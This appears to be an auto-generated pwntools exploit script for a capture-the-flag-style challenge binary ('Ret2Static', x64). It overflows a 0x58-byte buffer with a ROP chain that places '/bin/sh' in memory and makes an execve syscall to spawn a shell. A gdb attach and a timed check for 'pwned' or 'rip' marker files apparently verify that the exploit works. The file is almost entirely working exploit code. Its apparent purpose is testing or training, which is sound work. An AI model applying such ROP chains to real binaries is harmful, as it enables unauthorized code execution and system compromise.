from pwn import *

import os
import sf
import sys
import signal

target = process("./chall-test_Ret2Static-00-x64")
gdb.attach(target, execute="verify_exploit_static")

bof_payload = sf.BufferOverflow(arch=64)

bof_payload.set_input_start(0x58)
rop_chain = [4280916, 7036928, 4494453, b'/bin/sh\x00', 4771361, 4280916, 59, 4195990, 7036928, 4260003, 0, 4494453, 0, 4198908]
bof_payload.add_rop_chain(rop_chain)
payload = bof_payload.generate_payload()
target.sendline(payload)

# Exploit Verification starts here 15935728

def handler(signum, frame):
	raise Exception("Timed out")

def check_verification_done():
	while True:
		if os.path.exists("pwned") or os.path.exists("rip"):
			sys.exit(0)

signal.signal(signal.SIGALRM, handler)
signal.alarm(2)

try:
	while True:
		check_verification_done()
except Exception:
	print("Exploit timed out")
